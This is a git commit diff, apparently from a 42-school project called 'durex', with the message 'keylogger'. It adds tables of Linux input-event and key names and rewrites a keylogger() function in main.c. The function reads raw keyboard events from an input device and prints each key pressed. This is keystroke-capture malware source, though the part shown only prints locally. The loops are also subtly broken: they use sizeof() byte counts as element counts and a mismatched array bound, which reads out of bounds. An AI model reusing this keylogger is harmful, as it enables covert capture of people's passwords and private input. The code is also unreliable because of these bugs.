7a614c38be96be819713c03c8513ec7ad69382be
GBO <gbourgeo@student.42.fr>
2018-09-30 04:37:02 +0200

    keylogger

--- durex/main.c
+++ durex/main.c
@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/09/28 05:57:11 by root              #+#    #+#             */
-/*   Updated: 2018/09/28 18:07:49 by root             ###   ########.fr       */
+/*   Updated: 2018/09/30 01:08:09 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -73,6 +73,180 @@ static char			*get_keyboard()
 }
 
 int loop;
+typedef struct 	s_event
+{
+	char *name;
+	int value;
+}				t_event;
+
+t_event	event[] = {
+	{ "EV_SYN", 				EV_SYN },
+	{ "EV_KEY", 				EV_KEY },
+	{ "EV_REL", 				EV_REL },
+	{ "EV_ABS", 				EV_ABS },
+	{ "EV_MSC", 				EV_MSC },
+	{ "EV_SW",					EV_SW },
+	{ "EV_LED",					EV_LED },
+	{ "EV_SND", 				EV_SND },
+	{ "EV_REP", 				EV_REP },
+	{ "EV_FF", 					EV_FF },
+	{ "EV_PWR", 				EV_PWR },
+	{ "EV_FF_STATUS", 			EV_FF_STATUS }
+};
+
+t_event msc[] = {
+	{ "MSC_SERIAL",				MSC_SERIAL },
+	{ "MSC_PULSELED",			MSC_PULSELED },
+	{ "MSC_GESTURE",			MSC_GESTURE },
+	{ "MSC_RAW",				MSC_RAW },
+	{ "MSC_SCAN",				MSC_SCAN },
+	{ "MSC_TIMESTAMP",			MSC_TIMESTAMP }
+};
+
+t_event key[] = {
+	{ "KEY_RESERVED",			KEY_RESERVED },
+	{ "KEY_ESC",				KEY_ESC },
+	{ "KEY_1",					KEY_1 },
+	{ "KEY_2",					KEY_2 },
+	{ "KEY_3",					KEY_3 },
+	{ "KEY_4",					KEY_4 },
+	{ "KEY_5",					KEY_5 },
+	{ "KEY_6",					KEY_6 },
+	{ "KEY_7",					KEY_7 },
+	{ "KEY_8",					KEY_8 },
+	{ "KEY_9",					KEY_9 },
+	{ "KEY_0",					KEY_0 },
+	{ "KEY_G",					KEY_G },
+	{ "KEY_H",					KEY_H },
+	{ "KEY_MINUS",				KEY_MINUS },
+	{ "KEY_EQUAL",				KEY_EQUAL },
+	{ "KEY_BACKSPACE",			KEY_BACKSPACE },
+	{ "KEY_TAB",				KEY_TAB },
+	{ "KEY_Q",					KEY_Q },
+	{ "KEY_W",					KEY_W },
+	{ "KEY_E",					KEY_E },
+	{ "KEY_R",					KEY_R },
+	{ "KEY_T",					KEY_T },
+	{ "KEY_Y",					KEY_Y },
+	{ "KEY_U",					KEY_U },
+	{ "KEY_I",					KEY_I },
+	{ "KEY_O",					KEY_O },
+	{ "KEY_P",					KEY_P },
+	{ "KEY_LEFTBRACE",			KEY_LEFTBRACE },
+	{ "KEY_RIGHTBRACE",			KEY_RIGHTBRACE },
+	{ "KEY_ENTER",				KEY_ENTER },
+	{ "KEY_LEFTCTRL",			KEY_LEFTCTRL },
+	{ "KEY_A",					KEY_A },
+	{ "KEY_S",					KEY_S },
+	{ "KEY_D",					KEY_D },
+	{ "KEY_F",					KEY_F },
+	{ "KEY_J",					KEY_J },
+	{ "KEY_K",					KEY_K },
+	{ "KEY_L",					KEY_L },
+	{ "KEY_SEMICOLON",			KEY_SEMICOLON },
+	{ "KEY_APOSTROPHE",			KEY_APOSTROPHE },
+	{ "KEY_GRAVE",				KEY_GRAVE },
+	{ "KEY_LEFTSHIFT",			KEY_LEFTSHIFT },
+	{ "KEY_BACKSLASH",			KEY_BACKSLASH },
+	{ "KEY_Z",					KEY_Z },
+	{ "KEY_X",					KEY_X },
+	{ "KEY_C",					KEY_C },
+	{ "KEY_V",					KEY_V },
+	{ "KEY_B",					KEY_B },
+	{ "KEY_N",					KEY_N },
+	{ "KEY_M",					KEY_M },
+	{ "KEY_COMMA",				KEY_COMMA },
+	{ "KEY_DOT",				KEY_DOT },
+	{ "KEY_SLASH",				KEY_SLASH },
+	{ "KEY_RIGHTSHIFT",			KEY_RIGHTSHIFT },
+	{ "KEY_KPASTERISK",			KEY_KPASTERISK },
+	{ "KEY_LEFTALT",			KEY_LEFTALT },
+	{ "KEY_SPACE",				KEY_SPACE },
+	{ "KEY_CAPSLOCK",			KEY_CAPSLOCK },
+	{ "KEY_F1",					KEY_F1 },
+	{ "KEY_F2",					KEY_F2 },
+	{ "KEY_F3",					KEY_F3 },
+	{ "KEY_F4",					KEY_F4 },
+	{ "KEY_F5",					KEY_F5 },
+	{ "KEY_F6",					KEY_F6 },
+	{ "KEY_F7",					KEY_F7 },
+	{ "KEY_F8",					KEY_F8 },
+	{ "KEY_F9",					KEY_F9 },
+	{ "KEY_F10",				KEY_F10 },
+	{ "KEY_NUMLOCK",			KEY_NUMLOCK },
+	{ "KEY_SCROLLLOCK",			KEY_SCROLLLOCK },
+	{ "KEY_KP7",				KEY_KP7 },
+	{ "KEY_KP8",				KEY_KP8 },
+	{ "KEY_KP9",				KEY_KP9 },
+	{ "KEY_KPMINUS",			KEY_KPMINUS },
+	{ "KEY_KP4",				KEY_KP4 },
+	{ "KEY_KP5",				KEY_KP5 },
+	{ "KEY_KP6",				KEY_KP6 },
+	{ "KEY_KPPLUS",				KEY_KPPLUS },
+	{ "KEY_KP1",				KEY_KP1 },
+	{ "KEY_KP2",				KEY_KP2 },
+	{ "KEY_KP3",				KEY_KP3 },
+	{ "KEY_KP0",				KEY_KP0 },
+	{ "KEY_KPDOT",				KEY_KPDOT },
+	{ "KEY_ZENKAKUHANKAKU",		KEY_ZENKAKUHANKAKU },
+	{ "KEY_102ND",				KEY_102ND },
+	{ "KEY_F11",				KEY_F11 },
+	{ "KEY_F12",				KEY_F12 },
+	{ "KEY_RO",					KEY_RO },
+	{ "KEY_KATAKANA",			KEY_KATAKANA },
+	{ "KEY_HIRAGANA",			KEY_HIRAGANA },
+	{ "KEY_HENKAN",				KEY_HENKAN },
+	{ "KEY_KATAKANAHIRAGANA",	KEY_KATAKANAHIRAGANA },
+	{ "KEY_MUHENKAN",			KEY_MUHENKAN },
+	{ "KEY_KPJPCOMMA",			KEY_KPJPCOMMA },
+	{ "KEY_KPENTER",			KEY_KPENTER },
+	{ "KEY_RIGHTCTRL",			KEY_RIGHTCTRL },
+	{ "KEY_KPSLASH",			KEY_KPSLASH },
+	{ "KEY_SYSRQ",				KEY_SYSRQ },
+	{ "KEY_RIGHTALT",			KEY_RIGHTALT },
+	{ "KEY_LINEFEED",			KEY_LINEFEED },
+	{ "KEY_HOME",				KEY_HOME },
+	{ "KEY_UP",					KEY_UP },
+	{ "KEY_PAGEUP",				KEY_PAGEUP },
+	{ "KEY_LEFT",				KEY_LEFT },
+	{ "KEY_RIGHT",				KEY_RIGHT },
+	{ "KEY_END",				KEY_END },
+	{ "KEY_DOWN",				KEY_DOWN },
+	{ "KEY_PAGEDOWN",			KEY_PAGEDOWN },
+	{ "KEY_INSERT",				KEY_INSERT },
+	{ "KEY_DELETE",				KEY_DELETE },
+	{ "KEY_MACRO",				KEY_MACRO },
+	{ "KEY_MUTE",				KEY_MUTE },
+	{ "KEY_VOLUMEDOWN",			KEY_VOLUMEDOWN },
+	{ "KEY_VOLUMEUP",			KEY_VOLUMEUP },
+	{ "KEY_POWER",				KEY_POWER },
+	{ "KEY_KPEQUAL",			KEY_KPEQUAL },
+	{ "KEY_KPPLUSMINUS",		KEY_KPPLUSMINUS },
+	{ "KEY_PAUSE",				KEY_PAUSE },
+	{ "KEY_SCALE",				KEY_SCALE },
+	{ "KEY_KPCOMMA",			KEY_KPCOMMA },
+	{ "KEY_HANGEUL",			KEY_HANGEUL },
+	{ "KEY_HANGUEL",			KEY_HANGUEL },
+	{ "KEY_HANJA",				KEY_HANJA },
+	{ "KEY_YEN",				KEY_YEN },
+	{ "KEY_LEFTMETA",			KEY_LEFTMETA },
+	{ "KEY_RIGHTMETA",			KEY_RIGHTMETA },
+	{ "KEY_COMPOSE",			KEY_COMPOSE }
+};
+
+t_event led[] = {
+	{ "LED_NUML", 				LED_NUML },
+	{ "LED_CAPSL", 				LED_CAPSL },
+	{ "LED_SCROLLL", 			LED_SCROLLL },
+	{ "LED_COMPOSE", 			LED_COMPOSE },
+	{ "LED_KANA", 				LED_KANA },
+	{ "LED_SLEEP", 				LED_SLEEP },
+	{ "LED_SUSPEND", 			LED_SUSPEND },
+	{ "LED_MUTE", 				LED_MUTE },
+	{ "LED_MISC", 				LED_MISC },
+	{ "LED_MAIL", 				LED_MAIL },
+	{ "LED_CHARGING", 			LED_CHARGING }
+};
 
 void sigint(int sig)
 {
@@ -92,23 +266,59 @@ static void	keylogger(int keybd)
 		nbread = read(keybd, events, sizeof(struct input_event) * 128);
 		for (size_t i = 0; i < nbread / sizeof(struct input_event); i++)
 		{
-			printf("type: %d value: %d code: %d ", events[i].type, events[i].value, events[i].code);
-			if (events[i].type == EV_KEY && events[i].value == 0)
+			char *name = "UNKNOWN";
+			for (size_t j = 0; j < sizeof(event); j++)
 			{
-				printf("keyrelease: %d", events[i].code);
+				if (events[i].type == event[j].value)
+				{
+					name = event[j].name;
+					break ;
+				}
 			}
-			if (events[i].type == EV_KEY && events[i].value == 1)
+			printf("type: %s ", name);
+			if (events[i].type == EV_KEY)
 			{
-				printf("keypressed: %d", events[i].code);
+				name = "UNKNOWN";
+				for (size_t j = 0; j < sizeof(key); j++)
+				{
+					if (events[i].code == key[j].value)
+					{
+						name = key[j].name;
+						break ;
+					}
+				}
+				printf("code: %s ", name);
 			}
-			if (events[i].type == EV_KEY && events[i].value == 2)
+			else if (events[i].type == EV_LED)
 			{
-				printf("keyrepeat: %d", events[i].code);
+				name = "UNKNOWN";
+				for (size_t j = 0; j < sizeof(led); j++)
+				{
+					if (events[i].code == led[j].value)
+					{
+						name = led[j].name;
+						break ;
+					}
+					// printf("%ld\n", j);
+				}
+				printf("code: %s ", name);
 			}
-			if (events[i].type == EV_SW)
+			else if (events[i].type == EV_MSC)
 			{
-				printf("switch code: %d value: %d", events[i].code, events[i].value);
+				name = "UNKNOWN";
+				for (size_t j = 0; j < sizeof(key); j++)
+				{
+					if (events[i].code == msc[j].value)
+					{
+						name = msc[j].name;
+						break ;
+					}
+				}
+				printf("code: %s ", name);
+			} else {
+				printf("code: %d ", events[i].code);
 			}
+			printf("value: %d ; ", events[i].value);
 		}
 		printf("\n");
 	}
